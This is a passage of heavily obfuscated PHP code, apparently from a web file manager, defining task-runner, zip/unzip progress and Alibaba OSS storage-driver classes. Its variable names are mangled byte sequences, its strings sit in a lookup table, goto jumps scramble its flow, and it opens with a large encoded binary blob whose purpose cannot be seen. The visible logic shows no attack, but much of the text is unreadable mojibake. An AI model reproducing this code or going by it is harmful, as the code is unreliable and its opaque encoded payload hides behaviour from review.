4bÕQí¥U´Œ}$EIQEùúœØ¯_Şª&+·Œ¬').strrev('ñ{¾d!{Õ„MÏç6W3UŸ5N³Ng`2­æ@òr¯S;+W9R+Ä–™"')."\152\275\250\232\171\312\136\210\334\276\123\240\32\256\145\51\125\260\253\120\220\250\304\343\42\255\212\272\6\255\23\237\321\262\253\254\52\311\262\356\107\165\355\220\144\325\255\357"."\x78\xd5\x36\x7c\xf1\xf2\xc4\x80\xa7\x55\xa0\xae\x0\xda\x10\xa7\x58\x30\x86\x85\x26\x1b\xd3\x42\x9f\xe6\xc1\xef\x65\x73\xd8\xb4\xf8\x99\x91\x15\x5a\x86\x58\x43\x3a\x62\xfb\x27\xb2\xa2\x36\x2f"."\x9c\x9a\x65\xc9\x79\x6d\x55\xa5\xf8\x0\xe6\xeb\x2b\x39\xe8\x82\xc6\x24\xff\x92\x35\x1\x65\x79\x2c\xd7\xc8\xe8\x5e\xf\xb9\xb2\xc7\x2c\x9a\xce\x1a\x29\x48\xb2\x41\x9f\x58\x4e\x48\x19\x3c\x6a"."\5\125\4\127\44\12\350\72\41\41\247\365\111\24\213\200\11\217\25\7\245\23\340\142\201\336\111\266\340\273\157\176\33\105\274\273\322\163\225\46\247\54\333\15\340\264\264\125"."\x22\xbf\xcb\x2c\xd7\x15\x77\xf4\x94\xad\x27\xc4\x20\x3e\x1c\x3\x92\xa\xa\xfa\x12\x57\x4f\xb8\x53\xe4\x4e\x83\x80\x2d\x41\x2f\xe4\x13\x6e\x47\x31\xbf\x9c\xd2\x69\x2a\x41\x4a\x9e\x0\xbe\x2b"."\xe1\x1\xf9\xec\x83\x5b\xd2\xb6\xb2\xef\x1e\x57\x44\x20\xe6\x74\xc0\x1a\x67\xbe\x33\xb1\x61\xb8\xe8\x8f\xb8\x4d\x21\x53\x26\xe8\x13\x0\x3f\x59\x89\x86\x98\xdc\x3b\x61\x9a\x12\x86\x37\x17\x82".base64_decode('GiYU4bm10FBp0FOcPlrFlUs/qwaQoooqqMN1IusCc5tUOlWR1B1JpVYlkq3UP3tF')."\x32\x29\x25\x29\x25\x55\x24\x75\x77\x24\xba\xa6\x4a\x8b\x76\x46\x62\xf1\x8a\x34\xac\xbf\xd4\xa5\xa\x27\x67\x34\x29\xd6\x4d\x7a\x49\x2e\x1\xa7\xea\x45\xac\x65\x85\xe8\x9\xb9\x6e\x16\xc2\xf9"."\122\336\142\62\167\166\171\221\322\12\214\113\227\154\107\365\242\360\156\47\312\230\106\146\130\10\367\64\211\170\167\230\33\112\376\341\175\354\310\247\46\310\200\24\52\302\272\107"."\135\120\167\262\4\261\330\137\75\337\353\234\220\26\367\347\41\317\75\273\24\117\366\3\101\60\22\314\311\7\55\211\230\136\165\202\144\301\156\345\105\3\111\25\23\200\73\266"."\xdc\x2\xc5\xb5\x21\x6b\x40\xba\x48\xa0\x6c\xc\x58\x72\xc2\x94\x4a\xfa\x65\xf4\xdb\x93\xec\x6a\x83\x55\xaf\x9b\xa9\x34\xf\xef\x78\x21\x67\xfb\xdf\xe\x3\xef\x96\x45\xac\x0\x0", 10, -8))); goto d¼Œë¡±Õ; fÃ£¤ö÷Øì: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ Ğ¢‹æ¨, $ Úë¬Ÿç = 5.0) { if (!$ Ğ¢‹æ¨) { return; } $Áµ‰›† = Cache::get($ Ğ¢‹æ¨); if (!$Áµ‰›† || timeFloat() - floatVal($Áµ‰›†) >= $ Úë¬Ÿç) { Cache::set($ Ğ¢‹æ¨, timeFloat(), $ Úë¬Ÿç * 10); return !0; } return !1; } public static function timeLimitCall($Ç•¥ªÌ”, $ƒ¹Ğ›µ, $ô÷ÒÈıÑ, $ĞÎ÷·†ä = 5.0) { $ÇÄåÖİÏ =& $_SERVER[§ŒØóıü]; if (!$Ç•¥ªÌ” || !$ƒ¹Ğ›µ) { return; } self::$asyncAdd = !0; $û¡ò¢»Î = $ÇÄåÖİÏ[1776]; $åƒŞ•åû = Cache::get($û¡ò¢»Î, !0); $Şİ‰Ì…Ì = array($ÇÄåÖİÏ[1777] => timeFloat(), $ÇÄåÖİÏ[1778] => timeFloat(), $ÇÄåÖİÏ[264] => $ƒ¹Ğ›µ, $ÇÄåÖİÏ[1771] => $ô÷ÒÈıÑ, $ÇÄåÖİÏ[180] => $ĞÎ÷·†ä); if (is_array($åƒŞ•åû[$Ç•¥ªÌ”])) { $Şİ‰Ì…Ì[$ÇÄåÖİÏ[1778]] = $åƒŞ•åû[$Ç•¥ªÌ”][$ÇÄåÖİÏ[1778]]; } if (is_array($åƒŞ•åû[$Ç•¥ªÌ”])) { if (timeFloat() - $åƒŞ•åû[$Ç•¥ªÌ”][$ÇÄåÖİÏ[1777]] < $Şİ‰Ì…Ì[$ÇÄåÖİÏ[180]] * 0.3) { return; } $Şİ‰Ì…Ì[$ÇÄåÖİÏ[1778]] = $åƒŞ•åû[$Ç•¥ªÌ”][$ÇÄåÖİÏ[1778]]; } $åƒŞ•åû[$Ç•¥ªÌ”] = $Şİ‰Ì…Ì; Cache::set($û¡ò¢»Î, $åƒŞ•åû, 60); Cache::removeMemory($û¡ò¢»Î); write_log($ÇÄåÖİÏ[1779] . $Ç•¥ªÌ” . $ÇÄåÖİÏ[71] . $ƒ¹Ğ›µ, $ÇÄåÖİÏ[1773]); } public static function timeLimitCallLoop() { $†ÌÙÂğÃ =& $_SERVER[§ŒØóıü]; $ı¹Ì¦§Š = array($†ÌÙÂğÃ[1780]); $øœõÍë³ = in_array(strtolower(ACTION), $ı¹Ì¦§Š); if (!$øœõÍë³ && !self::$asyncAdd) { return; } $•ÅïŠ’Ê = $†ÌÙÂğÃ[1776]; $ÒÛÈïãÓ = Cache::get($•ÅïŠ’Ê, !0); if (!$ÒÛÈïãÓ || count($ÒÛÈïãÓ) <= 0) { return; } $ªÉèŸ— = !1; $É‡ÒŒ°İ = timeFloat(); $‚×ûØï = array(); foreach ($ÒÛÈïãÓ as $ğ¨äÉÎ => $è¥º°ú“) { if ($É‡ÒŒ°İ - $è¥º°ú“[$†ÌÙÂğÃ[1778]] > $è¥º°ú“[$†ÌÙÂğÃ[180]]) { $ªÉèŸ— = !0; try { Hook::apply($è¥º°ú“[$†ÌÙÂğÃ[264]], $è¥º°ú“[$†ÌÙÂğÃ[1771]]); write_log($†ÌÙÂğÃ[1781] . $ğ¨äÉÎ . $†ÌÙÂğÃ[71] . $è¥º°ú“[$†ÌÙÂğÃ[264]] . $†ÌÙÂğÃ[1782] . ACTION, $†ÌÙÂğÃ[1773]); } catch (Exception $áÛ ëŞÌ) { } continue; } $‚×ûØï[$ğ¨äÉÎ] = $è¥º°ú“; } if (!$ªÉèŸ—) { return; } if (!$‚×ûØï) { return Cache::remove($•ÅïŠ’Ê); } Cache::set($•ÅïŠ’Ê, $‚×ûØï, 60); Cache::removeMemory($•ÅïŠ’Ê); } public static function finished($­Ü¼Ô˜ø, $Ë¼¼Û±¼) { $¯Ê—ÍÅ =& $_SERVER[§ŒØóıü]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($¯Ê—ÍÅ[264] => $­Ü¼Ô˜ø, $¯Ê—ÍÅ[1771] => $Ë¼¼Û±¼); } private static function finishedRun() { $â“ĞÌÕï =& $_SERVER[§ŒØóıü]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $·‘‚ú) { try { Hook::apply($·‘‚ú[$â“ĞÌÕï[264]], $·‘‚ú[$â“ĞÌÕï[1771]]); } catch (Exception $İÀ¥¥•Ø) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ùê‘æ‚Ö =& $_SERVER[§ŒØóıü]; parent::startAfter(); Hook::bind($ùê‘æ‚Ö[1783], array($this, $ùê‘æ‚Ö[1784])); Hook::bind($ùê‘æ‚Ö[1199], array($this, $ùê‘æ‚Ö[1785])); $¾ªşñÜ£ =& $this->task; $¾ªşñÜ£[$ùê‘æ‚Ö[1786]] = $ùê‘æ‚Ö[1200]; if (!$¾ªşñÜ£[$ùê‘æ‚Ö[1573]]) { $¾ªşñÜ£[$ùê‘æ‚Ö[1573]] = LNG($ùê‘æ‚Ö[1787]); } } protected function endAfter() { $Á›ÊêÒ˜ =& $_SERVER[§ŒØóıü]; parent::endAfter(); Hook::unbind($Á›ÊêÒ˜[1783], array($this, $Á›ÊêÒ˜[1784])); Hook::unbind($Á›ÊêÒ˜[1199], array($this, $Á›ÊêÒ˜[1785])); } public function updateAfter() { $°µöıéØ =& $_SERVER[§ŒØóıü]; $éï‰é‹– =& $this->task; if (!$éï‰é‹–[$°µöıéØ[792]] || !$éï‰é‹–[$°µöıéØ[769]]) { return; } if ($éï‰é‹–[$°µöıéØ[1786]] == $°µöıéØ[1200]) { $‘®‹¢²µ = 0; if ($éï‰é‹–[$°µöıéØ[1726]]) { $‘®‹¢²µ = $éï‰é‹–[$°µöıéØ[1727]] / $éï‰é‹–[$°µöıéØ[1726]]; } $éï‰é‹–[$°µöıéØ[1675]] = $‘®‹¢²µ * 0.3; } else { if ($éï‰é‹–[$°µöıéØ[1786]] == $°µöıéØ[313]) { $‘®‹¢²µ = $éï‰é‹–[$°µöıéØ[1674]] / $éï‰é‹–[$°µöıéØ[792]]; $éï‰é‹–[$°µöıéØ[1675]] = 0.3 + $‘®‹¢²µ * 0.4; } else { if ($éï‰é‹–[$°µöıéØ[1786]] == $°µöıéØ[107]) { $Ú“¼ß˜¡ = 0; if ($éï‰é‹–[$°µöıéØ[1728]] == $°µöıéØ[107]) { $Ú“¼ß˜¡ = $éï‰é‹–[$°µöıéØ[1727]]; } $‘®‹¢²µ = ($éï‰é‹–[$°µöıéØ[1731]] + $Ú“¼ß˜¡) / $éï‰é‹–[$°µöıéØ[769]]; $éï‰é‹–[$°µöıéØ[1675]] = 0.3 + 0.4 + $‘®‹¢²µ * 0.3; } } } if ($éï‰é‹–[$°µöıéØ[1675]] > 0) { $ÖËáİ¥ª = timeFloat() - $éï‰é‹–[$°µöıéØ[1677]] - $éï‰é‹–[$°µöıéØ[1680]]; $éï‰é‹–[$°µöıéØ[1681]] = $ÖËáİ¥ª * (1 - $éï‰é‹–[$°µöıéØ[1675]]) / $éï‰é‹–[$°µöıéØ[1675]]; } } public function addFile($œúöÚ‘¨) { $¨è¼Éªã =& $_SERVER[§ŒØóıü]; $÷ÜÓ¹†” =& $this->task; $•¿öîÑ¸ = IO::info($œúöÚ‘¨); $÷ÜÓ¹†”[$¨è¼Éªã[1724]] = $•¿öîÑ¸[$¨è¼Éªã[32]]; $÷ÜÓ¹†”[$¨è¼Éªã[1726]] = $•¿öîÑ¸[$¨è¼Éªã[76]]; $÷ÜÓ¹†”[$¨è¼Éªã[1727]] = 0; $÷ÜÓ¹†”[$¨è¼Éªã[1070]] = $¨è¼Éªã[1747]; $÷ÜÓ¹†”[$¨è¼Éªã[1728]] = $¨è¼Éªã[1200]; $÷ÜÓ¹†”[$¨è¼Éªã[769]] = $•¿öîÑ¸[$¨è¼Éªã[76]]; $÷ÜÓ¹†”[$¨è¼Éªã[792]] = 1; $Ù¬‰ï½î = 0; $÷ÜÓ¹†”[$¨è¼Éªã[1735]] = array($¨è¼Éªã[1736] => $Ù¬‰ï½î + 1, $¨è¼Éªã[420] => $•¿öîÑ¸[$¨è¼Éªã[32]], $¨è¼Éªã[84] => $•¿öîÑ¸[$¨è¼Éªã[84]], $¨è¼Éªã[509] => $•¿öîÑ¸[$¨è¼Éªã[509]] ? $•¿öîÑ¸[$¨è¼Éªã[509]] : $•¿öîÑ¸[$¨è¼Éªã[84]]); $this->update(); } public function unzipAfter($©Í£ÂÃ) { $Ë…Ç‡ø‘ =& $_SERVER[§ŒØóıü]; $Ë œâä« =& $this->task; $Ë œâä«[$Ë…Ç‡ø‘[1786]] = $Ë…Ç‡ø‘[107]; $÷­‡‡‹— = IO::infoWithChildren($©Í£ÂÃ); $¾¬íŒˆ´ = 0; $Ë œâä«[$Ë…Ç‡ø‘[1735]] = array($Ë…Ç‡ø‘[1736] => $¾¬íŒˆ´ + 1, $Ë…Ç‡ø‘[420] => $÷­‡‡‹—[$Ë…Ç‡ø‘[32]], $Ë…Ç‡ø‘[84] => $÷­‡‡‹—[$Ë…Ç‡ø‘[84]], $Ë…Ç‡ø‘[509] => $÷­‡‡‹—[$Ë…Ç‡ø‘[509]] ? $÷­‡‡‹—[$Ë…Ç‡ø‘[509]] : $÷­‡‡‹—[$Ë…Ç‡ø‘[84]]); if ($÷­‡‡‹—[$Ë…Ç‡ø‘[33]] == $Ë…Ç‡ø‘[200]) { $Ë œâä«[$Ë…Ç‡ø‘[792]] = 1; } else { $Ë œâä«[$Ë…Ç‡ø‘[792]] = $÷­‡‡‹—[$Ë…Ç‡ø‘[79]][$Ë…Ç‡ø‘[77]]; } $Ë œâä«[$Ë…Ç‡ø‘[1070]] = $Ë…Ç‡ø‘[12]; $Ë œâä«[$Ë…Ç‡ø‘[1728]] = 0; $Ë œâä«[$Ë…Ç‡ø‘[1674]] = 0; $Ë œâä«[$Ë…Ç‡ø‘[1726]] = 0; $Ë œâä«[$Ë…Ç‡ø‘[1727]] = 0; $Ë œâä«[$Ë…Ç‡ø‘[1724]] = $Ë…Ç‡ø‘[12]; $Ë œâä«[$Ë…Ç‡ø‘[1731]] = 0; $Ë œâä«[$Ë…Ç‡ø‘[769]] = $÷­‡‡‹—[$Ë…Ç‡ø‘[76]]; $this->update(); self::log($Ë…Ç‡ø‘[1788] . json_encode(array($Ë œâä«, $÷­‡‡‹—))); } public function nameParse($ÄşÚ¬ª¸) { $¨¶£¾’  =& $_SERVER[§ŒØóıü]; $øëÙ»ÌÜ =& $this->task; if ($øëÙ»ÌÜ[$¨¶£¾’ [1786]] == $¨¶£¾’ [1200]) { $øëÙ»ÌÜ[$¨¶£¾’ [1786]] = $¨¶£¾’ [313]; $øëÙ»ÌÜ[$¨¶£¾’ [1731]] = 0; $øëÙ»ÌÜ[$¨¶£¾’ [769]] = 0; } $’©†Ä¹ = get_path_this($ÄşÚ¬ª¸); if (strstr($’©†Ä¹, $¨¶£¾’ [10])) { $øëÙ»ÌÜ[$¨¶£¾’ [1674]] += 1; $øëÙ»ÌÜ[$¨¶£¾’ [792]] += 1; } $øëÙ»ÌÜ[$¨¶£¾’ [1724]] = $ÄşÚ¬ª¸; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $óÃäê £ =& $_SERVER[§ŒØóıü]; parent::startAfter(); Hook::bind($óÃäê £[1789], array($this, $óÃäê £[1784])); $¯´Øö± =& $this->task; $¯´Øö±[$óÃäê £[1786]] = $óÃäê £[1200]; if (!$¯´Øö±[$óÃäê £[1573]]) { $¯´Øö±[$óÃäê £[1573]] = LNG($óÃäê £[1790]); } } protected function endAfter() { $š‰®Şéˆ =& $_SERVER[§ŒØóıü]; parent::endAfter(); Hook::unbind($š‰®Şéˆ[1789], array($this, $š‰®Şéˆ[1784])); } public function updateAfter() { $Û®†§‰¥ =& $_SERVER[§ŒØóıü]; $äÎ„½»× =& $this->task; if (!$äÎ„½»×[$Û®†§‰¥[792]] || !$äÎ„½»×[$Û®†§‰¥[769]]) { return; } if ($äÎ„½»×[$Û®†§‰¥[1786]] == $Û®†§‰¥[1200]) { $ÉÌîãÃÊ = $äÎ„½»×[$Û®†§‰¥[1727]]; if ($äÎ„½»×[$Û®†§‰¥[1728]] != $Û®†§‰¥[1200]) { $ÉÌîãÃÊ = 0; } $”Í«¥Èñ = ($äÎ„½»×[$Û®†§‰¥[1731]] + $ÉÌîãÃÊ) / $äÎ„½»×[$Û®†§‰¥[769]]; $äÎ„½»×[$Û®†§‰¥[1675]] = $”Í«¥Èñ * 0.3; } else { if ($äÎ„½»×[$Û®†§‰¥[1786]] == $Û®†§‰¥[313]) { $”Í«¥Èñ = $äÎ„½»×[$Û®†§‰¥[1674]] / $äÎ„½»×[$Û®†§‰¥[792]]; $äÎ„½»×[$Û®†§‰¥[1675]] = 0.3 + $”Í«¥Èñ * 0.5; } else { if ($äÎ„½»×[$Û®†§‰¥[1786]] == $Û®†§‰¥[107]) { $”Í«¥Èñ = 0; if ($äÎ„½»×[$Û®†§‰¥[1726]]) { $”Í«¥Èñ = $äÎ„½»×[$Û®†§‰¥[1727]] / $äÎ„½»×[$Û®†§‰¥[1726]]; } $äÎ„½»×[$Û®†§‰¥[1675]] = 0.3 + 0.5 + $”Í«¥Èñ * 0.2; } } } if ($äÎ„½»×[$Û®†§‰¥[1675]] > 0) { $‘––Ş•¢ = timeFloat() - $äÎ„½»×[$Û®†§‰¥[1677]] - $äÎ„½»×[$Û®†§‰¥[1680]]; $äÎ„½»×[$Û®†§‰¥[1681]] = $‘––Ş•¢ * (1 - $äÎ„½»×[$Û®†§‰¥[1675]]) / $äÎ„½»×[$Û®†§‰¥[1675]]; } } public function copyFileStart($ĞË§ÓÉ, $Ëï«êĞ…, $šéµš‡¸, $Ûœ†–í, $éùĞÙÅ, $ßàäÑç¥) { $ÂÔ…¡Ğ =& $_SERVER[§ŒØóıü]; parent::copyFileStart($ĞË§ÓÉ, $Ëï«êĞ…, $šéµš‡¸, $Ûœ†–í, $éùĞÙÅ, $ßàäÑç¥); $çÔÃòüß =& $this->task; if ($çÔÃòüß[$ÂÔ…¡Ğ[1786]] == $ÂÔ…¡Ğ[313]) { $çÔÃòüß[$ÂÔ…¡Ğ[1786]] = $ÂÔ…¡Ğ[107]; } $this->update(); } public function copyFileEnd($®¾÷, $ÑÖ¬—ü¾, $Øö£Ã€Í, $¨×İ°±ù, $›í¢”ê˜, $ùô•Û‹Ş) { $‚éæô“© =& $_SERVER[§ŒØóıü]; $å¹¹…Ü¬ =& $this->task; $å¹¹…Ü¬[$‚éæô“©[1727]] = $å¹¹…Ü¬[$‚éæô“©[1726]]; $å¹¹…Ü¬[$‚éæô“©[1731]] += $å¹¹…Ü¬[$‚éæô“©[1726]]; $å¹¹…Ü¬[$‚éæô“©[1728]] = $‚éæô“©[12]; $this->update(); } public function nameParse($úËÁÊü²) { $» ¬Ê  =& $_SERVER[§ŒØóıü]; $‚ü¶•‹÷ =& $this->task; if ($‚ü¶•‹÷[$» ¬Ê [1674]] < $‚ü¶•‹÷[$» ¬Ê [792]]) { $üğ§üü¬ = get_path_this($úËÁÊü²); if (strstr($üğ§üü¬, $» ¬Ê [10])) { $‚ü¶•‹÷[$» ¬Ê [1674]] += 1; } } if ($‚ü¶•‹÷[$» ¬Ê [1786]] == $» ¬Ê [1200]) { $‚ü¶•‹÷[$» ¬Ê [1786]] = $» ¬Ê [313]; } $‚ü¶•‹÷[$» ¬Ê [1724]] = $úËÁÊü²; $this->update(); } } goto F£»Æç ‰Ç; d®¼¶ïäª“: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ıÏÊÇ„¯) { parent::__construct($ıÏÊÇ„¯); $this->signatureVersion($_SERVER[§ŒØóıü][216]); } public function fileOutLink($¯ÛßÒ£Ã) { $º§´•»Ã =& $_SERVER[§ŒØóıü]; if (substr($¯ÛßÒ£Ã, 0, 7) == $º§´•»Ã[1343]) { $¯ÛßÒ£Ã = $º§´•»Ã[1344] . substr($¯ÛßÒ£Ã, 7); } header($º§´•»Ã[161] . $¯ÛßÒ£Ã); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($ˆ¥ûÒ£”) { parent::__construct(); include_once SDK_DIR . $_SERVER[§ŒØóıü][1401]; $this->_init($ˆ¥ûÒ£”); } public function _init($…â·ú¤Ó) { $‘ï¿Ìš£ =& $_SERVER[§ŒØóıü]; $this->config = $…â·ú¤Ó; foreach ($…â·ú¤Ó as $ï§‰ëØ¹ => $Ğ¶ÏÅÉˆ) { if (isset($this->{$ï§‰ëØ¹})) { $this->{$ï§‰ëØ¹} = $Ğ¶ÏÅÉˆ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($‘ï¿Ìš£[1402] . LNG($‘ï¿Ìš£[1403])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ä¤Ğ°í =& $_SERVER[§ŒØóıü]; $š³–ïƒÕ = new OSS\Model\CorsConfig(); $çœ‹Ã = new OSS\Model\CorsRule(); $çœ‹Ã->addAllowedOrigin($Ä¤Ğ°í[1404]); $çœ‹Ã->addAllowedMethod($Ä¤Ğ°í[1405]); $çœ‹Ã->addAllowedMethod($Ä¤Ğ°í[1406]); $çœ‹Ã->addAllowedMethod($Ä¤Ğ°í[1407]); $çœ‹Ã->addAllowedMethod($Ä¤Ğ°í[1408]); $çœ‹Ã->addAllowedMethod($Ä¤Ğ°í[160]); $çœ‹Ã->setMaxAgeSeconds(600); $çœ‹Ã->addExposeHeader($Ä¤Ğ°í[1409]); $çœ‹Ã->addAllowedHeader($Ä¤Ğ°í[1404]); $š³–ïƒÕ->addRule($çœ‹Ã); try { $this->client->putBucketCors($this->bucket, $š³–ïƒÕ); } catch (OSS\Core\OssException $…À¥³ğ€) { return !1; } return !0; } public function getBucketCors() { $‘àıèú =& $_SERVER[§ŒØóıü]; $ŒâˆŸ½½ = null; try { $ŒâˆŸ½½ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $´¦ı‰›¾) { return null; } if (!$ŒâˆŸ½½ || !($îèæ¥ = $ŒâˆŸ½½->getRules())) { return null; } $Ç ËÀ = $îèæ¥[0]->getAllowedOrigins(); $ÕÒéèŒü = $îèæ¥[0]->getAllowedMethods(); $ığé§ñä = $îèæ¥[0]->getMaxAgeSeconds(); $ëÔßØÜ„ = $îèæ¥[0]->getExposeHeaders(); $ æ¹¦³Ü = $îèæ¥[0]->getAllowedHeaders(); return array($‘àıèú[188] => isset($Ç ËÀ[0]) ? $Ç ËÀ[0] : $‘àıèú[12], $‘àıèú[192] => $ÕÒéèŒü, $‘àıèú[1410] => $ığé§ñä, $‘àıèú[1411] => isset($ëÔßØÜ„[0]) ? $ëÔßØÜ„[0] : $‘àıèú[12], $‘àıèú[190] => isset($ æ¹¦³Ü[0]) ? $ æ¹¦³Ü[0] : $‘àıèú[12]); } public function isBucketCors() { $ ì¦“‡ =& $_SERVER[§ŒØóıü]; $·ïş¢Èè = $this->getBucketCors(); if (!$·ïş¢Èè || !is_array($·ïş¢Èè)) { return !1; } if ($·ïş¢Èè[$ ì¦“‡[188]] != $ ì¦“‡[189] || $·ïş¢Èè[$ ì¦“‡[190]] != $ ì¦“‡[189]) { return !1; } $ÄËµÑü = array_map($ ì¦“‡[191], $·ïş¢Èè[$ ì¦“‡[192]]); if (!is_array($ÄËµÑü)) { $ÄËµÑü = array(); } $Ï­óÜ™î = array($ ì¦“‡[193], $ ì¦“‡[194], $ ì¦“‡[195], $ ì¦“‡[196], $ ì¦“‡[197]); $ØåÃüËÃ = array_diff($Ï­óÜ™î, $ÄËµÑü); return empty($ØåÃüËÃ); } public function mkfile($éê¸ÔÇ¿, $ŸÍìŠÏ˜ = '', $Óº§ÅŒ¶ = REPEAT_RENAME) { $Ç¬ƒ…ñË = $this->setContent($éê¸ÔÇ¿, $ŸÍìŠÏ˜); if ($Ç¬ƒ…ñË !== !1) { return $this->getPathOuter($éê¸ÔÇ¿); } return !1; } public function mkdir($·İ½Ì–÷, $‰œ½½â = REPEAT_SKIP) { if ($‰œ½½â && $this->_isFolder($·İ½Ì–÷)) { return $this->getPathOuter($·İ½Ì–÷); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($·İ½Ì–÷)); } catch (OSS\Core\OssException $ÍÀèøİ’) { return !1; } return $this->getPathOuter($·İ½Ì–÷); } private function fileList($‘©ÔÂ‰ü, $ê±™©ÊÙ = '', $Šô…¡«º = 0) { $ÏÖ›Ôä =& $_SERVER[§ŒØóıü]; $‘©ÔÂ‰ü = trim($‘©ÔÂ‰ü, $ÏÖ›Ôä[8]); $–­ÌÙüÂ = empty($‘©ÔÂ‰ü) && $‘©ÔÂ‰ü !== $ÏÖ›Ôä[198] ? $ÏÖ›Ôä[12] : $‘©ÔÂ‰ü . $ÏÖ›Ôä[8]; $‡ÚüàÅ = $ÏÖ›Ôä[12]; $“ÌÕ¼¸Ì = 1000; $Ü˜Ã’ ª = $½ˆŞ·Üö = array(); while (!0) { check_abort(); $‘İõ–ˆ‡ = array($ÏÖ›Ôä[1412] => $ê±™©ÊÙ, $ÏÖ›Ôä[1413] => $–­ÌÙüÂ, $ÏÖ›Ôä[1414] => $“ÌÕ¼¸Ì, $ÏÖ›Ôä[1415] => $‡ÚüàÅ); try { $íÖÚŒÑË = $this->client->listObjects($this->bucket, $‘İõ–ˆ‡); } catch (OSS\Core\OssException $òÍããÑ‚) { break; } $‡ÚüàÅ = $íÖÚŒÑË->getNextMarker(); $×õ¯«ŸÍ = $íÖÚŒÑË->getObjectList(); $â•½È ë = $íÖÚŒÑË->getPrefixList(); foreach ($×õ¯«ŸÍ as $Ä¢Ä¸—) { if ($Ä¢Ä¸—->getKey() == $–­ÌÙüÂ) { continue; } $ÓüğÂú© = $Ä¢Ä¸—->getKey(); $ˆìƒ¿è = $Ä¢Ä¸—->getSize(); $•³ıİ–ş = $Ä¢Ä¸—->getLastModified(); $±¾Ê’Ğ = $Šô…¡«º ? array($ÏÖ›Ôä[32] => $ÓüğÂú©, $ÏÖ›Ôä[76] => $ˆìƒ¿è, $ÏÖ›Ôä[180] => strtotime($•³ıİ–ş)) : $ÓüğÂú©; $—ÚÂÖüë = $ˆìƒ¿è == 0 && substr($ÓüğÂú©, strlen($ÓüğÂú©) - 1, 1) == $ÏÖ›Ôä[8] ? !0 : !1; $Â¯É™Ìí = array($ÏÖ›Ôä[76] => $ˆìƒ¿è, $ÏÖ›Ôä[1416] => $ˆìƒ¿è, $ÏÖ›Ôä[85] => strtotime($•³ıİ–ş), $ÏÖ›Ôä[1417] => $•³ıİ–ş); $this->cacheMethodInfoSet($ÓüğÂú©, $—ÚÂÖüë, $Â¯É™Ìí); if ($—ÚÂÖüë) { $Ü˜Ã’ ª[] = $ÓüğÂú©; continue; } $½ˆŞ·Üö[] = $±¾Ê’Ğ; } foreach ($â•½È ë as $„ÅÒ’„é) { $Ü˜Ã’ ª[] = $„ÅÒ’„é->getPrefix(); $this->cacheMethodInfoSet($„ÅÒ’„é->getPrefix(), !0); } if ($‡ÚüàÅ === $ÏÖ›Ôä[12]) { break; } } $this->cacheMethodInfoSet($‘©ÔÂ‰ü, !0); return array($ÏÖ›Ôä[82] => $Ü˜Ã’ ª, $ÏÖ›Ôä[83] => $½ˆŞ·Üö); } public function copyFile($ö—•‘³, $ÀÔƒê¿) { $ßúÆş©Ğ = $this->size($ö—•‘³); if ($ßúÆş©Ğ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ö—•‘³, $this->bucket, $this->pathEncode($ÀÔƒê¿)); } catch (OSS\Core\OssException $ö©®äö¾) { return !1; } return $this->getPathOuter($ÀÔƒê¿); } $‘îâ¬ƒ… = $this->multiCopyObject($ö—•‘³, $ÀÔƒê¿, $ßúÆş©Ğ); return $‘îâ¬ƒ… ? $this->getPathOuter($ÀÔƒê¿) : !1; } private function multiCopyObject($ÕÈëØŒÒ, $İ§²ÈÀš, $şšû½î) { $ÕÕû”ó¯ =& $_SERVER[§ŒØóıü]; try { $›Şú¢Ÿé = array(); if ($¹ĞÒá¦‡ = $this->hashMd5($ÕÈëØŒÒ)) { $›Şú¢Ÿé = array(OSS\OssClient::OSS_HEADERS => array($ÕÕû”ó¯[1418] => $¹ĞÒá¦‡)); } $çÃØÇåá = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($İ§²ÈÀš), $›Şú¢Ÿé); $îÌÅó®ş = 1; $ÃÔ¸İşã = 0; $€±’ª¬¿ = array(); $Òïôµ˜£ = 1024 * 1024 * 10; $ÜÌíÎ™ë = $this->client->generateMultiuploadParts($şšû½î, $Òïôµ˜£); foreach ($ÜÌíÎ™ë as $û‘’™Ëı => $Ù®Ç°—Ö) { $Õó³ïÚô = $ÃÔ¸İşã + (int) $Ù®Ç°—Ö[$ÕÕû”ó¯[1419]]; $¨·Áß·¼ = (int) $Ù®Ç°—Ö[$ÕÕû”ó¯[337]] + $Õó³ïÚô - 1; $Ğ¸ÀğŞ = array($ÕÕû”ó¯[1420] => $Õó³ïÚô, $ÕÕû”ó¯[1421] => $¨·Áß·¼); $€±’ª¬¿[] = $this->client->uploadPartCopy($this->bucket, $ÕÈëØŒÒ, $this->bucket, $this->pathEncode($İ§²ÈÀš), $îÌÅó®ş, $çÃØÇåá, $Ğ¸ÀğŞ); $îÌÅó®ş = $îÌÅó®ş + 1; } $³ÍõñÕä = array(); foreach ($€±’ª¬¿ as $û‘’™Ëı => $“ıÏŠ—”) { $³ÍõñÕä[] = array($ÕÕû”ó¯[1422] => $û‘’™Ëı + 1, $ÕÕû”ó¯[1423] => $“ıÏŠ—”); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($İ§²ÈÀš), $çÃØÇåá, $³ÍõñÕä); } catch (OSS\Core\OssException $ô©úß¼½) { return !1; } return !0; } public function moveFile($ĞæÔáªˆ, $òÅ¿¸ı) { if ($this->copyFile($ĞæÔáªˆ, $òÅ¿¸ı)) { $this->remove($ĞæÔáªˆ); return $this->getPathOuter($òÅ¿¸ı); } return !1; } public function delFile($¶·õùÙÓ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¶·õùÙÓ)); } catch (OSS\Core\OssException 